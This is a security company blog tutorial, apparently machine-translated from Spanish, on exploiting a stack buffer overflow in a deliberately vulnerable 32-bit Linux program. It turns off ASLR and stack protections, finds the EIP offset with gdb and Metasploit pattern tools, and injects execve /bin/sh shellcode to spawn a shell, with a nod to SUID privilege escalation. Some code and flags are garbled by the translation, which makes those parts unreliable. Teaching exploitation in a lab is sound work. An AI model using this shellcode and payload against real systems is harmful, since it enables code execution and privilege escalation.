---
layout: blog-detail
comments: true
title: "My name is overflow, buffer overflow"
date: 2018-07-03T16:38:00+00:00
categories:
    - Exploiting
tags:
    - buffer overflow
    - buffer overrun
    - exploit
    - overflow
    - overrun
    - stack
    - stack based
    - stack overrun
    - stack smashing
image_src: /assets/uploads/2018/07/Puffin-Security-My-name-is-overflow-buffer-overflow-exploiting-ciberseguridad.jpg
image_height: 1280
image_width: 1920
author: Yago Gutierrez
description: In principle it is already clear how we get control program flow leveraging a script out of bounds. Let&#8217;s see how the stack is for a function like yesterday #include &lt;stdio.h&gt; #include &lt;string.h&gt; void print(char* arg) { char buf[128]; strcpy(buf, arg); printf(&#8220;%sn&#8221;, buf); } int...
publish_time: 2018-07-03T16:38:00+00:00
modified_time: 2019-10-09T13:59:21+00:00
comments_value: 0
disqus_identifier: 623
---
In principle it is already clear how we get control program flow leveraging a script out of bounds. Let’s see how the stack is for a function like yesterday

#include <stdio.h>  
#include <string.h>

void print(char\* arg)  
{  
char buf\[128\];  
strcpy(buf, arg);  
printf(“%sn”, buf);  
}

int print(int argc, char\*\* argv)  
{  
if(argc < 2) return 1;  
imprimir(argv\[1\]);  
return 0;  
}

Ahem, please put something that we understand better

<print>:  
push   ebp  
mov    ebp,esp  
push   ebx  
sub    esp,0x84  
call   450 <\_\_x86.get\_pc\_thunk.bx>  
add    ebx,0x1aa8  
sub    esp,0x8  
push   DWORD PTR \[ebp+0x8\]  
lea    eax,\[ebp-0x88\]  
push   eax  
call   3d0 <strcpy@plt>  
add    esp,0x10  
sub    esp,0xc  
lea    eax,\[ebp-0x88\]  
push   eax  
call   3e0 <puts@plt>  
add    esp,0x10  
nop  
mov    ebx,DWORD PTR \[ebp-0x4\]  
leave  
ret

As we see reality is dirtier than it looks. This would be the stack just after the execution of the sub esp, 0x84, ie after finishing the prologue.

+-----------------------------+
|   Stack de la func caller   |
+-----------------------------+
|          char\* arg          | Arguments of the ejem cdecl function
+-----------------------------+
|        EIP guardado         | Objetive
+-----------------------------+
|        EBP guardado         |
+-----------------------------+ <- EBP
|             ...             |
+-----------------------------+
|       buf (128 bytes)       |
+-----------------------------+
|             ...             |
+-----------------------------+ <- ESP

I think it has become very clear that our goal is to humiliate kept stepping on the EIP, also could use the **saved EBP** manipulation, but that technique see (not much) later, mainly in the vulns _off-by-one_. I hope the reader clearly appreciate that strcpy () starts writing in buf, so to speak form at the bottom of it, writing being “up”. Labeled with ellipses fields represent in the stack not only are local variables, but also (as shown in the assembly code) other program data itself does not interest us calculate how much take that data and we do not care, although we consider them to know how much padding we must introduce before touching EIP (EIP remember that we want to put a specific address). I personally use the following method (is that I am doing things manually) will introduce A’s to fill buf (128), and then will put in groups of 4 identical characters, something like this: Ax128 + BBBB + CCCC + DDDD from so that when gdb see that he has broken, for example, when trying to access 0x44444444, as the 0x44 character ‘D’ indicates that it is necessary to introduce fill 128 bytes of buf more than 8 bytes, with the following 4 those who tread EIP. Let’s practice it:

(gdb) run \`perl -e 'print "A"x128'\`BBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ
Starting program: /home/arget/vuln \`perl -e 'print "A"x128'\`BBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ

Program received signal SIGSEGV, Segmentation fault.  
0x45454545 in ?? ()

Breaking in 0x45454545 means that EIP is “EEEE”, so to get to step EIP must introduce 128 + 3 \* 4 = 140. Let’s check EIP introducing specific bytes, “ARGT”  
(gdb) run \`perl -e ‘print “A”x140’\`ARGT  
Starting program: /home/arget/vuln \`perl -e ‘print “A”x140’\`ARGT  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAARGT

Program received signal SIGSEGV, Segmentation fault.  
0x54475241 in ?? ()

We see that EIP contains 0x54475241, which is ([little endian](https://en.wikipedia.org/wiki/Endianness)…) 41524754, which corresponds precisely with “ARGT” We managed to put in EIP arbitrary “direction”.

Obtaining this information, you can be accelerated with frameworks such as Metasploit module with the pattern:

$ /opt/metasploit/tools/exploit/pattern\_create.rb -l 200
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

This creates a chain module deterministically of any length so that four characters followed never repeated. Using the -l parameter will indicate the length we want, we must be guided by the size of the stack frame we see in the asm code. Now we put that string in the program:

(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag  
Starting program: /home/arget/vuln Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag  
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.  
0x37654136 in ?? ()

Breaks when accessing 0x37654136, had a big endian 36 41 65 37 and converted into ASCII characters ([asciitohex.com](https://www.asciitohex.com/) It is a good tool, or you can always use a -e echo “x36x41x65x37” or python/perl one-line or even a miss 36416537 | xxd -PS -r) turns out to be 6Ae7 and employ the pattern\_offset Metasploit module for the exact offset within the chain we were provided:

$ /opt/metasploit/tools/exploit/pattern\_offset.rb -q 6Ae7  
\[\*\] Exact match at offset 140

Confirming what we already knew, that there are 140 bytes to the EIP saved.

Once you undoubtedly possess control program flow must tell you what to do, this is possibly the most exciting part, although we now remain in the fold of 1996, somewhere must start, and it will be first without face protection. The prefer any exploitation start it first for Linux, Windows and expand into better stay sane as long as possible, and it turns out that Windows is exploiting many times the best way to the psychiatric. Additionally, I ask the reader not it stays in the practices of this “course”, you need to take ease, each binary can be exploited generally in various ways, and can sometimes be interesting excessively complicated, in Internet is also easy to find many CTFs of exercises without stopping, a good example is exploit-exercises.com.

There is also a lot of literature out there (I grew up as exploiter reading (almost) all articles [SET](http://www.set-ezine.org/), Although no point of comparison with [phrack](http://phrack.org/)), We have a good example in [UAD](https://unaaldia.hispasec.com/)[.](http://phrack.org/)[  
](http://phrack.org/)

Anyway, let’s get in position, back in 1996, yet there was no [ASLR (or](https://en.wikipedia.org/wiki/Address_space_layout_randomization) [PaX)](https://en.wikipedia.org/wiki/PaX) sudo sysctl -w kernel.randomize\_va\_space = 0) or were implementing compilers [code improvements](https://en.wikipedia.org/wiki/Buffer_overflow_protection) (GCC -D\_FORTIFY\_SOURCE parameter = 0) nor was the concept of canary or other protective stack (GCC parameter -fno-stack-protector), nor was there [D.E.P](https://en.wikipedia.org/wiki/Executable_space_protection) ([NX](https://en.wikipedia.org/wiki/NX_bit)/W^X/ExecShield/PaX/etc) (-z execstack parameter GCC) nor [executables independent position](https://en.wikipedia.org/wiki/Position-independent_code) They were too frequent (GCC parameters -no-foot -fno-ft), it was not uncommon to find binaries [full RELRO](http://blog.isis.poly.edu/exploitation%20mitigation%20techniques/exploitation%20techniques/2011/06/02/relro-relocation-read-only/) (And nowadays GCC not have it by default XD) and also machines [64-bit](https://es.wikipedia.org/wiki/X86-64) will be more of a project (GCC parameter -m32). If you want to enter further into the time you can always consult the [wikipedia](https://es.wikipedia.org/wiki/1996).

I explain that I’ve put in the previous paragraph was bracketed to indicate that it is necessary to use it to disable each protection measure. While most are parameters for GCC, the first is a command to disable ASLR, which is necessary before starting to run the examples. Once you’re done with exploiting run sudo sysctl -w remember kernel.randomize\_va\_space = 2, since it is a very important safety measure that should not be disabled (although this parameter is reset would reset) .Prosigamos, compile the vulnerable code we have viewed:

$ gcc vuln.c -o vuln -fno-stack-protector -D\_FORTIFY\_SOURCE=0 -z execstack -m32 -no-pie -fno-pie

And now, as we have seen, we calculate the filling we need to EIP saved (it is therefore necessary we have added several compilation options, which can drastically alter the behavior of the program).

$ /opt/metasploit/tools/exploit/pattern\_create.rb -l 200
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

$ gdb -q vuln  
Reading symbols from vuln…(no debugging symbols found)…done.  
(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag  
Starting program: /home/arget/vuln Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag  
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.  
0x37654136 in ?? ()  
(gdb) quit  
A debugging session is active.

Inferior 1 \[process 7579\] will be killed.

Quit anyway? (y or n) y

$ echo -e “x36x41x65x37”  
6Ae7

$ /opt/metasploit/tools/exploit/pattern\_offset.rb -q 6Ae7  
\[\*\] Exact match at offset 140

Now what we do is introduce machine code that performs the actions we want, for example, run `/bin/sh` for a shell. This code is called shellcode, precisely because it is a code that usually get a shell. On the Internet there are numerous shellcodes that can be used (yes, you should always verify that it does what it claims to do, before using it), but in the next episode we will see how to build a good shellcode for every occasion, no beauty want anyone programming in asm miss.

Anyway, for now we better this shellcode

xor eax, eax  
push eax  
push 0x68732f2f  
push 0x6e69622f  
mov ebx, esp  
push eax  
push ebx  
mov ecx, esp  
mov al, 0xb  
int 0x80

We can assemble with nasm (nasm -o sc.asm sc.bin is necessary to add at the beginning a line “BIT 32” to indicate that the assembly as a 32-bit code) .We can get the assembly opcodes (opcode is the value number (usually in hex) corresponding to an assembler instruction, ie machine language) by xxd sc.bin.

Well, the shellcode should have no 0x00 because strcpy () finishes copying to find that value, and made this shellcode is designed to avoid them.  
The shellcode it will place at the beginning of buf, so now we need to get the address of buf, evidently by gdb:

(gdb) disas print 
Dump of assembler code for function print:
   0x080484c2 <+0>:     push   %ebp
   0x080484c3 <+1>:     mov    %esp,%ebp
   0x080484c5 <+3>:     sub    $0x88,%esp
   0x080484cb <+9>:     sub    $0x8,%esp
   0x080484ce <+12>:    pushl  0x8(%ebp)
   0x080484d1 <+15>:    lea    -0x88(%ebp),%eax
   0x080484d7 <+21>:    push   %eax
   0x080484d8 <+22>:    call   0x8048370 <strcpy@plt>
   0x080484dd <+27>:    add    $0x10,%esp
   0x080484e0 <+30>:    sub    $0xc,%esp
   0x080484e3 <+33>:    lea    -0x88(%ebp),%eax
   0x080484e9 <+39>:    push   %eax
   0x080484ea <+40>:    call   0x8048380 <puts@plt>
   0x080484ef <+45>:    add    $0x10,%esp
   0x080484f2 <+48>:    nop
   0x080484f3 <+49>:    leave  
   0x080484f4 <+50>:    ret    
End of assembler dump.

Observe the code of print(). After executing strcp () must be in the stack and data we provide. Hence we place a breakpoint (a point where the program stops until we give the order to continue).

(gdb) br \*print +27  
Breakpoint 1 at 0x80484dd  
Placed at the breakpoint.

(gdb) run \`perl -e ‘print “A”x144’\`  
Starting program: /home/arget/vuln \`perl -e ‘print “A”x144’\`

Breakpoint 1, 0x080484dd in print ()  
We proceed to run it with the same amount of bytes that will put him (addresses vary depending on the size of the arguments passed to the program) .The execution stops at the breakpoint we had placed and can analyze the situation

    (gdb) x/16x $esp
    0xffffd1e0:     0xffffd1f0      0xffffd4d2      0xf7e5f549      0x000000c2
    0xffffd1f0:     0x41414141      0x41414141      0x41414141      0x41414141
    0xffffd200:     0x41414141      0x41414141      0x41414141      0x41414141
    0xffffd210:     0x41414141      0x41414141      0x41414141      0x41414141
    

We found that from 0xffffd1f0 begins our fruit. So if we put the 0xffffd1f0 address in EIP, will proceed to execute our shellcode (because there you will place). Do not forget to adjust the size of the filling we put depending on the size of the shellcode (in our case 23). \[The attentive reader will have appreciated that where points esp still remains the direction of our buf, is the argument passed to strcpy(), and the next address in the stack corresponds to the argument to main() (which is obtained as the argument of print ())\]

(gdb) run \`cat sc.o\`\`perl -e 'print "A"x(140-23) . "xf0xd1xffxff"'\`
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/arget/vuln \`cat sc.o\`\`perl -e 'print "A"x(140-23) . "xf0xd1xffxff"'\`

Breakpoint 1, 0x080484dd in imprimir ()  
(gdb) c  
Continuing.  
1�Ph//shh/bin��PS���  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����  
process 13260 is executing new program: /usr/bin/bash  
Error in re-setting breakpoint 1: No symbol table is loaded. Use the “file” command.  
Error in re-setting breakpoint 1: No symbol table is loaded. Use the “file” command.  
Error in re-setting breakpoint 1: No symbol table is loaded. Use the “file” command.  
warning: Could not load shared library symbols for linux-vdso.so.1.  
Do you need “set solib-search-path” or “set sysroot”?  
Error in re-setting breakpoint 1: No symbol table is loaded. Use the “file” command.  
Error in re-setting breakpoint 1: No symbol table is loaded. Use the “file” command.  
sh-4.4$ whoami  
arget  
sh-4.4$

Now we proceed to try out the debugger

$ /home/arget/vuln \`cat sc.o\`\`perl -e 'print "A"x(140-23) . "xf0xd1xffxff"'\`
1�Ph//shh/bin��PS���
                    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
Segmentation fault (\`core' generado)

For that when executed in gdb, environment variables (which are also in the stack, as are passed to the program parameters) vary, in particular varies the variable \_ yes, a variable which is an underscore. This variable contains the name that the program has been executed by the command env can see that the variable \_ is set to /usr/bin/env (env shows that the variable “\_” from its own stack). During the execution of a program in gdb this variable assumes the value “/usr/bin/gdb” (probably because it inherits all environment variables gdb) as can be seen in the same gdb using the x command

$ gdb -q vuln
Reading symbols from vuln...(no debugging symbols found)...done.
(gdb) br \*main
Breakpoint 1 at 0x80484f5
(gdb) run
Starting program: /home/arget/vuln

Breakpoint 1, 0x080484f5 in main ()  
(gdb) x/1024s $esp  
0xffffd34c: “A36133536701”  
0xffffd352: “”  
0xffffd353: “”  
\[…\]  
0xffffdb4f: “XDG\_MENU\_PREFIX=gnome-”  
0xffffdb66: “\_=/usr/bin/gdb” <<<<<<  
0xffffdb75: “LANG=es\_ES.UTF-8”

While when the program is executed by bash it does not.

$ cat a.c
#include <stdio.h>
#include <stdlib.h>
int main()
{
    printf("%sn", getenv("\_"));
    return 0;
}

$ gcc a.c -o a

$ ./a  
./a

$ /home/arget/a  
/home/arget/a

$ /home/arget/a asd  
/home/arget/a

$ /home/arget/../arget/a asd  
/home/arget/../arget/a

You can see that through programs such as ltrace and strace occurs as in gdb, I guess they just spend their own environment variables to the program they are debugging. I urge the curious to investigate containing the above stack of main () addresses, can be illustrative.

In any case one way to avoid problems is to run the program with a null environment. But this is not always possible … Keep in mind that not only the variable “\_” modifies the stack, gdb also adds two environment variables that need to be removed by unset unset environment LINES and COLUMNS environment. Sometimes this is enough to get the address, but if not, we must now adjust the difference between variables \_’s. Anyway, I have not found a way to accurately calculate the exact address, sometimes is arranged by subtracting the difference between the lengths of names to the address on other occasions say that this is something hazardous. You should spend time to investigate this issue because it is not something extremely fascinating and practical,

Anyway

$ /home/arget/vuln \`cat sc.o\`\`perl -e 'print "A"x(140-23) . "x10xd2xffxff"'\`
1�Ph//shh/bin��PS���
                    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ���
sh-4.4$ whoami
arget
sh-4.4$

A good question is what use is getting a program that already do what you control is not intended to do. I really do not have much, just for practice to bring it to an environment where it does make sense, as a binary with the SUID bit, thus privilege elevation would be obtained. Many methods employ elevation of privilege vulnerabilities in binary as sudo or passwd.

It’s time to go saying goodbye, the next time we see the exploitation with the occasional protection. Certainly something much more interesting.
    
At Puffin Security, we use the ELITE SECURITY TESTING CONSULTING methodology so you can rest assured that your organization will have the highest level of cloud security. 

Complete the form, and we'll be in touch as soon as possible

[![Lets Audit Button](/assets/uploads/2023/01/Puffin-security-blog-button-lest-audit-2.jpg 'lets Audit Button')](https://hub.puffinsecurity.com/quote)
